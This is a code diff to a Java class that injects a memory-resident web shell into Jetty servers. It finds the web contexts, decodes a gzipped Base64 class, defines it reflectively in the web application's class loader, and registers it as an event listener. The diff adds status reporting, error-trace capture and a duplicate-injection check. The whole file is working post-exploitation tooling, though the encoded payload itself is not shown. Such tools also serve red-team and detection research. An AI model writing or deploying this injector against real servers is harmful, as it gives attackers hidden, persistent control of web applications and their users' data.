@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.injector.jetty;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
@@ -14,22 +15,49 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * tested v7、v8、v9
- *
  * @author ReaJason
  */
 public class JettyListenerInjector {
 
+    private String msg = "";
+
     public JettyListenerInjector() {
+        List<Object> contexts = null;
         try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object listener = getShell(context);
-                inject(context, listener);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
         }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath");
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public String getClassName() {
@@ -80,30 +108,21 @@ public class JettyListenerInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return webAppClassLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
-    public static void inject(Object context, Object listener) throws Exception {
-        if (isInjected(context, listener.getClass().getName())) {
-            System.out.println("listener is already injected");
-            return;
-        }
-        invokeMethod(context, "addEventListener", new Class[]{EventListener.class}, new Object[]{listener});
-        System.out.println("listener added successfully");
-    }
-
-    @SuppressWarnings("unchecked")
-    public static boolean isInjected(Object context, String className) throws Exception {
-        // jetty v8、 v9
+    public void inject(Object context, Object listener) throws Exception {
         Object object = invokeMethod(context, "getEventListeners");
         Object[] eventListeners = new Object[0];
         if (object instanceof List) {
@@ -112,11 +131,16 @@ public class JettyListenerInjector {
             eventListeners = (Object[]) object;
         }
         for (Object eventListener : eventListeners) {
-            if (eventListener.getClass().getName().contains(className)) {
-                return true;
+            if (eventListener.getClass().getName().contains(getClassName())) {
+                return ;
             }
         }
-        return false;
+        invokeMethod(context, "addEventListener", new Class[]{EventListener.class}, new Object[]{listener});
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -165,7 +189,7 @@ public class JettyListenerInjector {
 
             }
         }
-        throw new NoSuchFieldException(name);
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
@@ -197,6 +221,21 @@ public class JettyListenerInjector {
             throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
